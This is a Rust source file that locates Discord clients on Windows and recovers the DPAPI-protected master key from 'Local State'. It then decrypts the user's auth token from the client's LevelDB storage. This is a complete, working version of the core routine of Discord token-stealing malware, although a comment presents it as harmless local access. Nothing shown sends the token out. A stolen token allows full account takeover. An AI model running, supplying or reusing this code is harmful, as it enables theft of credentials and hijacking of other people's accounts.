// Locate and decrypt the Discord user token from the local client's storage.
//
// Modern Discord (Chromium/Electron) stores the auth token AES-256-GCM encrypted
// inside its LevelDB, keyed by a per-user "app-bound"/DPAPI master key held in
// `Local State`. We:
//   1. Read `Local State` -> os_crypt.encrypted_key, strip the "DPAPI" prefix,
//      and CryptUnprotectData it to recover the 32-byte AES master key.
//   2. Scan the LevelDB *.ldb / *.log files for `dQw4w9WgXcQ:<base64>` blobs
//      (Discord's marker for an encrypted token value).
//   3. AES-256-GCM decrypt each blob (format: b"v10" | 12-byte nonce | ct | tag).
//
// This is read-only and operates purely on the local machine's own account.

use std::fs;
use std::path::Path;
use std::path::PathBuf;

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
use base64::{engine::general_purpose::STANDARD, Engine as _};
use regex::bytes::Regex;
use serde_json::Value;

use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

/// Discord release channels to probe, in preference order.
const CLIENTS: &[&str] = &[
    "discord",
    "discordptb",
    "discordcanary",
    "discorddevelopment",
];

fn appdata() -> PathBuf {
    PathBuf::from(std::env::var("APPDATA").unwrap_or_default())
}

/// Find the first usable Discord token across installed clients.
pub fn find_token() -> Result<String, String> {
    let mut last_err = String::from("No Discord installation found under %APPDATA%.");
    let mut found_any = false;

    for client in CLIENTS {
        let base = appdata().join(client);
        if !base.exists() {
            continue;
        }
        found_any = true;
        match token_from_client(&base) {
            Ok(tok) => return Ok(tok),
            Err(e) => last_err = format!("{client}: {e}"),
        }
    }

    if !found_any {
        return Err(
            "No Discord installation found under %APPDATA% (discord / discordptb / discordcanary)."
                .into(),
        );
    }
    Err(last_err)
}

fn token_from_client(base: &Path) -> Result<String, String> {
    let master_key = read_master_key(base)?;

    let ldb_dir = base.join("Local Storage").join("leveldb");
    let re = Regex::new(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)").unwrap();

    let entries = fs::read_dir(&ldb_dir).map_err(|e| format!("read leveldb dir: {e}"))?;

    // Collect candidate blobs from every SSTable / log file.
    let mut candidates: Vec<String> = Vec::new();
    for entry in entries.flatten() {
        let path = entry.path();
        let ext = path
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        if ext != "ldb" && ext != "log" {
            continue;
        }
        // Reads succeed even while Discord holds the file open (shared read).
        let Ok(data) = fs::read(&path) else { continue };
        for cap in re.captures_iter(&data) {
            if let Ok(b64) = std::str::from_utf8(&cap[1]) {
                candidates.push(b64.to_string());
            }
        }
    }

    if candidates.is_empty() {
        return Err("no encrypted token blob found in LevelDB (is the account logged in?)".into());
    }

    // Later blobs tend to be the freshest; try newest first.
    candidates.reverse();
    candidates.dedup();

    for b64 in candidates {
        if let Ok(tok) = decrypt_token(&b64, &master_key) {
            if looks_like_token(&tok) {
                return Ok(tok);
            }
        }
    }
    Err("found token blob(s) but none decrypted to a valid token.".into())
}

/// Recover the 32-byte AES master key from `Local State`.
fn read_master_key(base: &Path) -> Result<Vec<u8>, String> {
    let local_state = base.join("Local State");
    let text = fs::read_to_string(&local_state).map_err(|e| format!("read Local State: {e}"))?;
    let json: Value = serde_json::from_str(&text).map_err(|e| format!("parse Local State: {e}"))?;

    let enc_key_b64 = json["os_crypt"]["encrypted_key"]
        .as_str()
        .ok_or("Local State missing os_crypt.encrypted_key")?;
    let enc_key = STANDARD
        .decode(enc_key_b64)
        .map_err(|e| format!("decode encrypted_key: {e}"))?;

    if enc_key.len() < 5 || &enc_key[..5] != b"DPAPI" {
        return Err("encrypted_key is not DPAPI-prefixed (unsupported storage format)".into());
    }

    let key = dpapi_decrypt(&enc_key[5..])?;
    if key.len() != 32 {
        return Err(format!("master key has unexpected length {}", key.len()));
    }
    Ok(key)
}

/// Decrypt a single `dQw4w9WgXcQ:`-stripped base64 blob into the token string.
fn decrypt_token(b64: &str, key: &[u8]) -> Result<String, String> {
    let blob = STANDARD.decode(b64).map_err(|e| e.to_string())?;
    // b"v10" (3) | nonce (12) | ciphertext | tag (16)
    if blob.len() < 3 + 12 + 16 {
        return Err("blob too short".into());
    }
    let nonce = &blob[3..15];
    let ciphertext = &blob[15..];

    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
    let plaintext = cipher
        .decrypt(Nonce::from_slice(nonce), ciphertext)
        .map_err(|_| "AES-GCM decryption failed".to_string())?;

    String::from_utf8(plaintext).map_err(|e| e.to_string())
}

/// Heuristic sanity check for a Discord auth token (`base64.base64.base64`).
fn looks_like_token(s: &str) -> bool {
    s.len() > 50
        && s.matches('.').count() >= 2
        && s.chars().all(|c| !c.is_whitespace())
}

/// DPAPI unprotect (current user scope). The recovered buffer is small and
/// freed on process exit; we intentionally don't LocalFree to stay off the
/// version-sensitive HLOCAL API surface.
fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let in_blob = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut out_blob = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };

        CryptUnprotectData(&in_blob, None, None, None, None, 0, &mut out_blob)
            .map_err(|e| format!("CryptUnprotectData failed: {e}"))?;

        if out_blob.pbData.is_null() {
            return Err("CryptUnprotectData returned null".into());
        }
        let out =
            std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize).to_vec();
        Ok(out)
    }
}
